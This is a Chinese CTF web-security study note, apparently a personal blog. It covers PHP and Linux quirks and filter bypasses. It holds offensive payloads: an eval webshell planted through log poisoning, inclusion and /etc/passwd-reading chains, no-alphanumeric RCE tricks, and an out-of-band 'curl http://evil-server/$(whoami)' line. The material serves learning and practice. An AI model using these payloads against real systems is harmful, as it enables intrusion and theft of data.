---
title: 新web小记
date: 2021-09-28 10:47:28
author: Na0H
headimg: /img/atimg/web.jpg
tags:	
- 学习笔记
categories:
- 学习笔记
excerpt: 梳理一下，偶尔梳理
description: 梳理一下，偶尔梳理

---

<!-- more -->

## 信息收集

1. 页面源代码：F12、禁止右键时修改url格式：view-source:url

2. 看请求包和响应包、robots.txt防爬虫

3. 多地ping找真实ip：[爱站超级ping](https://ping.aizhan.com/)、[Ping.cn](https://www.ping.cn/)、[多地Ping站长工具 ](http://ping.chinaz.com/)、[dig.ping](http://dig.ping.pe/)
   指纹识别：[潮汐指纹](http://finger.tidesec.net/)、[云悉指纹识别](https://www.yunsee.cn/)
   子域名、旁站：（指纹识别网址一般都提供查找子域名和旁站，也可以自己搜索一下）
   搜索引擎：[FOFA网络空间测绘系统](https://fofa.so/)、[ZoomEye("钟馗之眼")](https://www.zoomeye.org/)、[Shodan](https://www.shodan.io/)、[Censys](https://censys.io/)

4. 源码泄漏：

   - tar、tar.gz、zip、rar

   - .svn：url.svn 工具[svnhack](https://github.com/callmefeifei/SvnHack)

   - .git：url/.git/xxx  工具[githack](https://github.com/lijiejie/GitHack)

   - vim缓存：.swp、.swo、.swn
     临时文件是在vim编辑文本时就会创建的文件，
     如果程序正常退出，临时文件自动删除，如果意外退出就会保留
     当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容

     以 `index.php` 为例	 (注意：index前有 " . ")
     	第一次产生的缓存文件名为 `.index.php.swp`
     	第二次意外退出后，文件名为`.index.php.swo`
     	第三次产生的缓存文件则为 `.index.php.swn`

   - mdb：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了

5. 一些网站信息泄漏：

   - 一些技术文档可能由于开发、运维人员失误放了一些东西在里面
   - 探针:如雅黑：url/tz.php
   - 管理员邮件、管理员帐号
   - （url/editor）某编辑器editor最新版默认配置下，如果目录不存在，则会遍历服务器根目录

6. 目录扫描：（和爆破一样，重要的还是字典，可以用这个工具生成：[pydictor](https://github.com/LandGrey/pydictor)）

   - [dirsearch](https://github.com/maurosoria/dirsearch)
   - [dirmap](https://github.com/H4ckForJob/dirmap)
   - [7kbscan-WebPathBrute：Web路径暴力探测工具](https://github.com/7kbstorm/7kbscan-WebPathBrute)





## 杂7杂8

### 配置文件位置

常用于查看路由转发，可能把flag藏到哪个路径

nginx

```
/usr/local/nginx/conf/nginx.conf
/etc/nginx/nginx.conf
```

apache

```
/etc/httpd/conf/httpd.conf
```

### 日志文件位置

可以用于日志包含拿shell

nginx

```
/var/log/nginx/access.log
```

apache

```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access.log
```

iis日志文件：

```
%systemroot%\system32\logfiles\
```



### 查看文件内容

```
Linux：cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev

PHP：file_get_content()、show_source()、include()、highlight_file()
假如在执行命令时冒号:和括号被禁
就需要使用一些无需括号的php语言结构，如：echo、print、isset、unset、include、require
```



### =在base64中起填充作用

等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的





## Linux下的一些特性

### 一些符号

```
*			# 通配符,匹配任意字符
?			# 占位符,匹配任意一个字符 
作用类似正则 (可绕过文件名过滤，如：tac *、?at flag.php）
%0a(换行符)
$			# 变量调用符号
|           # 第一条命令结果作为第二条命令的输入
||          # 第一条执行失败，执行第二条命令
;           # 连续指令功能。
&           # 连接的两条命令都会执行
&&          # 当第一条执行成功后执行后续命令
> 			# 重定向输出符号（覆盖）
>> 			# 重定向输出符号（追加）
```

### Linux下的引号

单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的

双引号里的变量会被解析，双引号里可以出现转义字符

反引号：命令替换，指shell能够将一个命令的标准输出插在一个命令行中任何位置。

shell中有两种方法作命令替换：把shell命令用反引号或者$(…)结构括起来，其中，$(…)格式受到POSIX标准支持，也利于嵌套。

```
a=123
echo '$a'
# $a
echo "$a"
# 123

echo The date and time is `date` 
# The date and time is 三 6月 15 06:10:35 CST 2005 

echo Your current working directory is $(pwd) 
# Your current working directory is /home/howard/script 
```

反斜杠：

```
反斜杠一般用作转义字符，或称逃脱字符，
Linux如果echo要让转义字符发生作用，就要使用-e选项，
且转义字符要使用双引号echo -e "\n" 
反斜杠的另一种作用，就是当反斜杠用于一行的最后一个字符时，
Shell把行尾的反斜杠作为续行，这种结构在分几行输入长命令时经常使用。
```



### linux shell中的特殊符号：如$()、${}

#### $()和 `` ：命令替换

- `` 基本可在所以unix shell中使用，而 $() 不是所有shell都支持

如下：

![](https://i.loli.net/2021/09/24/4J2gcERz7YSqbhP.png)



#### ${}：变量替换

`$var`和`${var}`效果类似，但 `${ }` 能更精确的界定变量名称的范围

如下，使用`echo $ab`想要输出的是`$a的内容+字符b`，但是会被解析成`$ab`

![](https://i.loli.net/2021/09/24/gMFLeJmwVur6tHU.png)

一些更深入的用法：

（转载自 (https://blog.csdn.net/x1269778817/article/details/46535729) )

![](https://i.loli.net/2021/09/24/ajOF4t1kYphfyv9.png)



#### $(())：数学运算

支持如`加+、减-、乘*、除/、取模%` 数学运算

```
${_}
返回上一次的执行结果

ctfshow 57
ban了数字，但需要传入c=36:echo ${_} 	
#返回上一次的执行结果echo $(()) 	 #0
echo ~$(()) 					#~0
echo $((~$(()))) 				#~0是-1
$(($((~$(())))$((~$(())))))  	#$((-1-1))即$$((-2))是-2
echo $((~-37)) 	 				#~-37是36
~$(())=-0；
$((~$(())))=-1；
那么36个$((~$(())))相加再取反即得36
```



#### $?

$?表示上一条命令执行结束后的传回值。

- 通常0代表执行成功
- 非0代表执行有误



### $IFS

[$IFS - Linux Shell Scripting Wiki (cyberciti.biz)](https://bash.cyberciti.biz/guide/$IFS)

[Shell中的IFS解惑_Simple life-CSDN博客](https://blog.csdn.net/whuslei/article/details/7187639)

简而言之，$IFS的默认值是 space, tab, newline



### >/dev/null

/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失

在执行了`>/dev/null`后，标准输出就会不再存在，
没有任何地方能够找到输出的内容。



## PHP

[PHP: PHP 手册 - Manual](https://www.php.net/manual/zh/index.php)

### 一些特性

#### PHP处理上传文件

php在处理上传文件时，会将上传文件放在临时文件夹

命名格式为：`/tmp/php??????`（windows下则有[`.tmp`]后缀）
`php[0-9A-Za-z]{3,4,5,6}`默认为php+4/6位随机数字和大小写字母



#### php短标签

`<?=`  是  `<?php echo` 的简写形式

做题时可能遇到php被ban，就可以用短标签来绕过

以下取自php官方文档

> 当解析一个文件时，PHP 会寻找起始和结束标记，也就是 `<?php` 和 `?>`，这告诉 PHP 开始和停止解析二者之间的代码。此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。
>
> PHP 有一个 echo 标记简写 `<?=`， 它是更完整的 `<?php echo` 的简写形式
>
> ps：短标记 (第三个例子) 是被默认开启的，但是也可以通过 [short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag) php.ini 来直接禁用。如果 PHP 在被安装时使用了 **--disable-short-tags** 的配置，该功能则是被默认禁用的。



#### 分号;  被过滤

之前做题遇到，分号`;`被ban掉，那么咱们传入的语法就不正确,无法正常运行

绕过方法是利用`?>`来结尾
要注意的是：`?>`后的php代码就不会被正常解析，而是当成html输出到页面上



#### 00截断

**条件**：

- PHP版本小于5.3.4
- php.ini中的magic_quotes_gpc设置为Off

**00截断的原理**：ascii中的0作为特殊字符保留，表示字符串结束

像十六进制的0x00、url编码中的%00，具体使用情况视环境而定



**举2个例子**：

1. 文件上传中，ban了`.php`后缀，若符合00截断条件，可以这样绕过：

   - 抓包，修改上传路径为：/上传路径/文件名.php+00截断；
     (如：/upload/1.php+00截断)
   - 补充：这里要注意的是 要在**路径**处进行00截断，而不是在文件名处，
     因为过滤的对象通常是文件名
     像：1.php0x00a.jpg，截断了a.jpg，传入1.php，依然无法绕过
   - 如下，因为是post传参，可以用bp改十六进制为0x00进行00截断
     ![](https://i.loli.net/2021/09/23/PGvzJ1VanMesj38.png)

   

2. 如下，要求传入的参数等于1-9任意一个数字，且传入的参数长度大于1
   因为是url传参，使用url编码%00即00截断绕过，浏览器会自行解码%00

   ![](https://i.loli.net/2021/09/23/yzUvmdwT54kDFoX.png)



#### 强|弱比较

- 强比较`===`：先比较类型是否相同；再比较值

- 弱类型比较`==`：会将字符类型转换为相同类型，在比较值

  ps：若比较数字和字符串 | 涉及数字内容的字符串；则字符串会转换为数值并按数值进行比较

> eg：
>
> 当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内
> 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
>
> ```php
> var_dump("admin"==0);    //true			
> # admin为字符串，转换即为0var_dump("1admin"==1);   //true			
> # 字符串中的数值的开始部分决定了其值var_dump("admin1"==1)    //false			
> var_dump("admin1"==0)    //true
> var_dump("0e123456"=="0e4456789"); //true 
> # 将0e|0E识别为科学计数法；而0的n次方始终为0，故相等Copy
> ```

[PHP: PHP 类型比较表 - Manual](https://www.php.net/manual/zh/types.comparisons.php)

![](https://i.loli.net/2021/09/28/3VSoM1K6I4dtmlg.png)



### 一些php函数

#### md5()

`md5(string,raw)`

- String: 必需，为要计算的字符串
- Raw:
  - true： 原始16字符二进制格式
  - false：32字符十六进制数（默认）



1. 利用md5($pass,true)构造万能密码sql注入

   1. 后端查询语句：

      ```sql
      select * from 'admin' where password=md5($pass,true)
      ```

      

   2. 若MD5值经hex转换为字符串后为’or’+balabala这样的字符串；那么拼接的查询语句为： 

      ```sql
      select * from `admin` where password=''or'balabala'
      ```

      

   3. 当’or’后的值为true时，即可构成万能密码；在此利用到一个mysql特性：
      `在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数`（测试时发现只要是数字都可以）
      (ps：这种情况必须有单引号括起来
      如`password='xxx' or '1xxxxxxxxx'`就相当于`password='xxx' or 1`；故返回值为true)

      

   4. 常用payload：`ffifdyop`

##### md5强碰撞脚本

[浅谈md5弱类型比较和强碰撞 - 合天网安](https://segmentfault.com/a/1190000039189857)



##### 弱比较bypass

利用弱比较特性，传入一些MD5编码后为0e开头的字符串，即0的n次方还是0

```php
一些md5编码后得到0exxx（此处xxx为十进制字符）的字符串
原字符串					md5值
QNKCDZO			0e830400451993494058024219903391
240610708		0e462097431906509019562988736854
aabg7XSs		0e087386482136013740957780965295
aabC9RqS		0e041022518165728065344349536299
s878926199a		0e545993274517709034328855841020
s155964671a		0e342768416822451524974117254469
s214587387a		0e848240448830537924465865611904
s214587387a		0e848240448830537924465865611904
s878926199a		0e545993274517709034328855841020
s1091221200a	0e940624217856561557816327384675
s1885207154a	0e509367213418206700842008763514
qebi7zl0		0e649420541288950724577306786996
qebaur5g		0e352312259284787676841028696030
qe20k7jl		0e416004725936696827118806457976
qe9vwdjf		0e288029216666843876260611249898
```



###### 补一些脚本

```python
# 生成md5值为0exxx，还有一些套娃关卡的第一关也是要求验证码，改一下就能用了
import hashlib
l = 'qwertyuiopasdfghjklzxcvbnm1234567890'
for i in l:
    for j in l:
        for k in l:    
            for m in l:        
                for n in l:            
                    for o in l:                
                        for p in l:                    
                            for q in l:                        
                                f = i + j + k + m + n + o + p + q                        
                                md5 = hashlib.md5(f.encode(encoding='UTF-8')).hexdigest()                        
                                if md5[:2] == '0e' and str.isdigit(md5[2:]):                            
                                    print(f)                            
                                    print(md5)
```



```python
# 碰到的某道题 要求变量$a==md5($a)
# 0e215962017
import hashlibfor 
i in range(0,10**41):	
    i='0e'+str(i)	
    md5=hashlib.md5(i.encode()).hexdigest()	
    if md5[:2]=='0e' and md5[2:].isdigit():		
        print('md5:{} '.format(i))		
        break
```



##### 强比较bypass

- 数组绕过

  ```
  eg：(md5($id) === md5($gg) && $id !== $gg)直接数组绕过：?id[]=1&gg[]=2
  ```

- 还有最近碰到的：

  ```php
  (string)$_POST['a1']!==(string)$_POST['a2']&&md5($_POST['a1'])===md5($_POST['a2'])}
  # 最后转换为字符串比较，因此使用数组就不可行了
  (md5(implode('',$_GET['username']))===md5(implode('',$_GET['password']))
  # implode()会先把数组元素拼接成字符串再进行md5加密，使用数组就不可行了
  ```

  只能使用两组MD5值相同的不同字符串了，这里可以用脚本跑，
  下面是url编码过后的值：
  
  ```php
  # 1
  a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
  
  # 2
  a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
  ```
  
  



#### substr()、sha1()、base64_decode

`substr()`、`sha1()`、`base64_decode()`只能处理传入的字符串数据
当传入数组后会报出Warning错误，但仍会正常运行并返回值，当==左右两边都错误时，并且正常运行返回相同的值，就可以是判定条件成立

bypass：对`substr()`、`sha1()`、`base64_decode()`传入数组则返回null

```php
$a=[];var_dump(substr($a, 123));		//NULL
var_dump(sha1($a));						//NULL
# sha1后为0e数字的值：aaroZmOk aaO8zKZF aaK1STfY
# aaK1STfY	0e76658526655756207688271159624026011393
# aaO8zKZF	0e89257456677279068558073954252716165668
var_dump(substr($a, 123) === sha1($cc));	//bool(true)
```



#### intval()

获取变量的整数值

`intval ( mixed $value , int $base = 10 ) : int`

value：要转换的数量值，base：转换所用进制

三个特性：

- 成功：返回var的整数值；
  失败 or 空数组：返回0；
  非空数组：返回1

- 如果 `base` 是 0，通过检测 `value` 的格式来决定使用的进制：

  - 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
  - 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
  - 将使用 10 进制 (decimal)。

- base为0，变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换，ps：前提是进行弱类型比较

  > 默认遇到`非数字字符`就会停止识别
  > 如：`intval($_GET[1])`传入1=666aa；intval得到结果为666![](https://i.loli.net/2021/09/23/LvJFOVbSqXae8lY.png)

  > eg1:
  >
  > ![](https://i.loli.net/2021/03/16/rmzM8cI3FtHa4lA.png)
  > 由此可输入三种payload：
  >
  > - 十六进制：?num=0x117c 
  >
  > - 小数点：?num=4476.110
  >
  > - ?num=4476e1
  >
  > 
  >
  > eg2:
  >
  > ![朴实无华](https://i.loli.net/2021/03/16/lHMVZnLrtFq9REp.png)
  > Intval在处理字符串型的科学计数法时只输出e前的数字，而+1后又作为数字处理
  >
  > echo intval(1e10); 	=》10000000000
  >
  > echo intval("1e10"); 	=》1
  >
  > echo intval("1e10"+1); =》10000000001



#### is_numeric()

**is_numeric()** ：判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。

is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断因此输入%20password在解析变量名就会变成password

**bypass**：

```php
passwd=1234567%20passwd=1234567%00
```

此外：在某些cms中，会利用如下代码检测用户输入

```php
# 该片段判断参数s是否为数字，是则带入数据库查询，不是则返回0
$s = is_numeric($_GET['s'])?$_GET['s']:0;
$sql="insert into test(type)values($s);";  
//是 values($s) 不是values('$s')
mysql_query($sql);
```

但可以将sql语句转换为16进制传给参数

[![img](https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg)](https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg)



#### in_array()

```php
bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )
```

ps：strict相当于是否开启强比较

- 不提供$strict参数 (即默认为`false`)时，会进行`松散比较`，判断$needle是否在数组$haystack中
- $strict=`true`；还会比较$needle和$haystack中`元素类型是否相同`

```php
$array=[0,1,2,'3'];var_dump(in_array('abc', $array));  //true	
# 'abc'转换为0
var_dump(in_array('1bc', $array));  //true	
# '1bc'转换为1
# 转换整型int/浮点型float会返回元素个数；
# 转换bool返回Array中是否有元素；
# 转换成string返回'Array'，并抛出warning
```

**array_search()和in_array()类似**





#### ereg()

正则表达式匹配，在php7.0.0版本后被去除

存在NULL截断漏洞，可以使用%00截断来绕过正则匹配~

> 像ctfshow web108
>
> ```
> if(ereg("^[a-zA-Z]+$", $_GET['c'])===FALSE))
> ```
>
> 就可以用 `a%00`来绕过，在%00后就可以任意传入了



#### preg_match()

1. preg_match只能处理字符串，当传入数组时会返回false
2. [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
3. `.`不会匹配换行符；
   eg:`preg_match('/^.*(flag).*$/', $a)`可令`a="\nflag"`
   而非多行模式下，`$`会忽略末尾的`%0a`即空字符；
   eg:`preg_match('/^flag$/', $_GET['a']) && $_GET['a'] !== 'flag'`可输入`a=flag%0a`



#### eval

> [PHP: eval - Manual](https://www.php.net/manual/zh/function.eval)
> eval — 把字符串作为PHP代码执行：
>
> ```
> eval(string `$code`): [mixed]
> ```
>
> code为要执行的字符串，传入的代码不能包含打开/关闭PHP tags；且要以分号结尾
>
> （实际可以把eval($code)的效果看成将$code这部分直接插入到php代码里~）
>
> > eval是语言构造器而不是一个函数，不能被可变函数调用
> >
> > 可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。
> > ·
> > 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数



#### assert

> [PHP: assert - Manual](https://www.php.net/manual/zh/function.assert)
>
> assert把整个字符串当作php代码执行，而eval是把合法的php代码执行
>
> 在PHP7.1版本以后， assert()默认不再可以执行代码
> (assert在更新后无法将使用字符串作为参数，而GET或POST传入的数据默认就是字符串类型）



#### preg_replace()

preg_replace() /e模式下可以执行代码：[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

> preg_replace — 执行一个正则表达式的搜索和替换(PHP 4, PHP 5, PHP 7)
>
> 搜索`subject`中匹配`pattern`的部分， 以`replacement`进行替换。
>
> 
>
> 第一个参数`$pattern`：搜索的模式，可以是一个字符串或者字符串数组，可以加`\e`修正符。
>
> 第二个参数`$replacement`：要替换的字符。
>
> 第三个参数`$subject`：需要被处理的字符串。
>
> 问题出在第一个参数的`\e`修正符上。当加上了`\e`修正符号时，`$replacement`会被当做php代码片段执行。这个环境需要在`php5.4`下。`php7.0`完全放弃了该函数，`php5.5的后续版本`会爆出提示，要求`preg_replace_callback()`来代替该函数。



#### creat_function()

代码注入 [解析create_function()(seebug.org)](https://paper.seebug.org/94/)

> 创建匿名函数：
>
> ```php
> create_function('$name','echo $name."a"')
> ```
>
> 就类似于
>
> ```php
> function name($name) {	echo $name."a";}
> ```
>
> 那么传入`a=;}phpinfo();/*`就会得到：
>
> ```php
> function name($name) {	echo $name;}phpinfo();/*;}
> ```
>
> ;}将前面的语句和函数闭合，/*把后面的;}注释掉，phpinfo()；就成功执行了



#### curl()

[php curl实现发送get和post请求 - 简书 (jianshu.com)](https://www.jianshu.com/p/7fab00c11770)

[网鼎杯-Fakebook-反序列化和SSRF和file协议读取文件 (shuzhiduo.com)](https://www.shuzhiduo.com/A/l1dygVWqJe/)



#### strcmp()

`strcmp(str1,str2)`：比较两个字符串str1和str2

- str1<str2 返回<0
- str1>str2返回>0
- str1=str2 返回0

ps：数据类型不匹配(即传入非字符串类型)，也会返回0 （仅php<5.3）

bypass：同样的，给strcmp的参数为数组也会返回null

```
# 传入 passwd[]=xxx
实际是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等（某种意义上null相当于false）
```



#### open_basedir()绕过

##### chdir()、ini_set()函数组合

利用ini_set()设置php.ini的值，在函数执行时生效，脚本结束后恢复原状。

```php
ini_set ( string $varname , string $newvalue ) : string
```

varname是需要设置的值；newvalue是设置成为新的值
成功时返回旧的值，失败时返回 FALSE

```php
payload：
ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system(‘cat ../../../../../etc/passwd’);
```



##### glob://

glob://协议是php5.3.0以后一种查找匹配的文件路径模式，而单纯传参glob://是没办法列目录的，需要结合其他函数方法

###### scandir()+glob://

只能列出根目录以及open_basedir()允许目录下的文件

```php
<?php
var_dump(scandir('glob:///*'));
>
```



###### DirectoryIterator+glob://

DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)

```php
payloadL:
<?php
$a = new DirectoryIterator("glob:///*.txt");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
#	glob:///*	会列出根目录下的文件
# 	glob://*	会列出open_basedir允许目录下的文件
```

###### opendir()+readdir()+glob://

同样只能列出根目录已经open_basedir()允许的目录

```php
<?php
if ( $b = opendir('glob:///*') ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```







## 命令执行

### 命令执行函数

PHP命令执行函数：

- [escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php) — 把字符串转码为可以在 shell 命令里使用的参数
- [escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php) — shell 元字符转义
- [exec](https://www.php.net/manual/zh/function.exec.php) — 执行一个外部程序
- [passthru](https://www.php.net/manual/zh/function.passthru.php) — 执行外部程序并且显示原始输出
- [proc_close](https://www.php.net/manual/zh/function.proc-close.php) — 关闭由 proc_open 打开的进程并且返回进程退出码
- [proc_get_status](https://www.php.net/manual/zh/function.proc-get-status.php) — 获取由 proc_open 函数打开的进程的信息
- [proc_nice](https://www.php.net/manual/zh/function.proc-nice.php) — 修改当前进程的优先级
- [proc_open](https://www.php.net/manual/zh/function.proc-open.php) — 执行一个命令，并且打开用来输入/输出的文件指针。
- [proc_terminate](https://www.php.net/manual/zh/function.proc-terminate.php) — 杀除由 proc_open 打开的进程
- [shell_exec](https://www.php.net/manual/zh/function.shell-exec.php) — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
- [system](https://www.php.net/manual/zh/function.system.php) — 执行外部程序，并且显示输出
- 反引号``

python：

- system
- popen
- subprocess.call
- spawn

java：

- java.lang.Runtime.getRuntime().exec(command)

  

### 一些bypass

1. 空格：

   - %09(tab)、%20(space)、%0a(换行)、\t

   - $9(url编码下$9为linuxshell进程的第九个参数，始终为空字符)

   - ${IFS}、$IFS$9、$IFS%09

   - <>、< （如cat<123）（输出、输出重定向）
     ( 利用输出作为输入：?a=flag.php -> ?a={ls,-l} )

     

2. 黑名单：

   - 通配符：

     - `*`0到无穷个任意字符
     - `?` 一个任意字符
     - `[ ]` 一个在括号内的字符，e.g. `[abcd]`
     - `[ - ]` 在编码顺序内的所有字符
     - `[^ ]` 一个不在括号内的字符

   - 夹杂字符：引号：(''、""、``) 、${x}、$1、转义字符\

   - `${}`:
     会识别包含的第一个字符，只要将第一个字符修改为如空格，tab，注释，回车就会避免被直接当成变量，而将其执行为PHP代码

     ps:在被“”包裹时候直接${}是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码

     

3. 利用`系统变量`切片构造命令：
   	如/ = ${PATH:0:1} = /bin/xxx[0]



4. 过滤分号`;`

   - 可以用`?>`闭合<?php
     如：include%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
   - 假如函数为system()这些命令执行函数，且输出会被重定向到/dev/null这种不可访问的地方
     可以用`;`来绕过，若过滤了分号可以用`%0a`(换行) 或者 &、|这些命令分隔符

   

5. 黑名单绕过

   - `a=l;b=s;$a$b`

   - base64 `echo "bHM=" | base64 -d`
   - `/?in/?s` => `/bin/ls`
   - 连接符 `cat /etc/pass'w'd`
   - 未定义的初始化变量 `cat$x /etc/passwd`







### 一些思路

#### 获得文件内容

```php
linux:
cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、strings、od、grep

php:
file_get_content()、show_source()、include()、require()、highlight_file()、文件包含+伪协议

假如冒号:和括号()被禁，可以使用一些无需括号的语言结构，如：
echo、print、isset、unset、include、require
还可以利用cp、mv将flag的内容写入其他文件然后访问
```



#### 无回显

- bash反弹shell

- DNS外带数据

- http外带

  `curl http://evil-server/$(whoami)``wget http://evil-server/$(whoami)`

- 无带外时利用 `sleep` 或其他逻辑构造布尔条件



#### 长度限制绕过

如下，通过命令行重定向来写入命令
利用ls按时间排序把命令写入文件a，再利用sh 执行

```
>wget\>foo.\>comls -t>ash a
```

> 摘自[4.5. 命令注入 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)](https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html)
>
> 在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 
>
> 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件



#### 嵌套eval

因为eval()的作用相当于把其参数拼接到代码中去，由此可构造嵌套eval逃逸过滤

```php
如 eval($_GET['code']);
若传入?code=eval($_GET[1]);&1=phpinfo();
则:
源码为 eval(eval($_GET[1]); 
而1又为 phpifno();     
那么最终拼接进源码的就是1的值phpinfo();
```



#### 日志包含拿shell

下面用的是nginx的日志文件路径：/var/log/nginx/access.log

```php
user_agent：<?php eval($_post[1]);?>
然后：
include($_GET[1]);&1=/var/log/nginx/access.log
```

**ps：日志包含尽量一次成功，不然错误代码会影响后面代码解析**
		**可以在本地试一下再传**



#### 文件包含+伪协议->代码执行

文件包含函数：require()、include()等

常用伪协议：php://filter、glob://、data:txt/plain,xxx等

> ctfshow 32、33
>
> ```
> // ;被ban使用?>进行闭合 (php格式：<?php ?>)，再进行传参：
> 
> web32payload：
> 
> ?c=include%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
> 
> web33payload：
> 
> ?c=require%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
> ```
>
> ctfshow 39
>
> ```php
> if(!preg_match("/flag/i",$c))
> {
> 	include($c.".php")
> }
> ```
>
> payload：
> `data:text/plain,<?php system('cat *');?>`
>
> 利用文件包含+伪协议，解析php语句，因为前面的php语句已经闭合了，
> `.php`不会被include()解析，而是会被当成html直接显示到页面上
>
> 如传入`?c=data://text/plain,<?=phpinfo();?>`,执行命令后会在末尾输出1.php







### 构造rce指令|方法

下面的中心思想都是利用各种方法构造出命令执行的函数or指令



#### 无字母数字rce

顾名思义就是把字母数字都给过滤掉了

可以利用像异或、自增、取反：`$、+、-、^、~、|`来构造payload

1. [一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
2. [无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
3. [无字母数字绕过正则总结（含上传临时文件、异或、或、取反、自增脚本-羽](https://blog.csdn.net/miuzzx/article/details/109143413)
4. [ctfshow web入门 web41_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/108569080)

##### 极客大挑战2019 rce me

> 异或生成命令![](https://i.loli.net/2021/04/21/vCOrG7lMoFH2dVa.png)
>
> 执行：![](https://i.loli.net/2021/04/21/hiUkTYXbFSc2Cwo.png)
> 同理构造一句话：
> ![](https://i.loli.net/2021/04/21/BLbCJk12NQGVmtK.png)
> 执行如下：![](https://i.loli.net/2021/04/21/1GJSj278QlNWvcg.png)
> 蚁剑连接，disable_function绕过一下即可
> ![](https://i.loli.net/2021/04/21/967z2HlmZa8cTgJ.png)
>
> 



##### ctfshow 8月赛吃瓜杯 shellme_revenge

> 开篇一个phpinfo（原本的shellme因为一些失误操作，使得flag直接出现在phpinfo里，也就成了真正的签到题）
>
> 看cookie得到hint：?looklook，得到源码：
>
> ```php
> <?php
> error_reporting(0);
> if ($_GET['looklook']){
>     highlight_file(__FILE__);
> }else{
>     setcookie("hint", "?looklook", time()+3600);
> }
> if (isset($_POST['ctf_show'])) {
>     $ctfshow = $_POST['ctf_show'];
>     if (is_string($ctfshow) || strlen($ctfshow) <= 107) {
>         if (!preg_match("/[!@#%^&*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/",$ctfshow)){
>             eval($ctfshow);
>         }else{
>             echo("fucccc hacker!!");
>         }
>     }
> } else {
> 
>     phpinfo();
> }
> ```
>
> 因为disable_function禁用了大部分的函数，并且正则过滤掉了很多东西，但留出了字母C、0123、还有一些基本的符号，
> 无字母数字rce无疑，由此可以自增获得所有字母，然后就是历时1天的尝试了，
>
> 第一个点是无引号定义字符串，这里是用官方文档的第三种方式<<<来定义
>
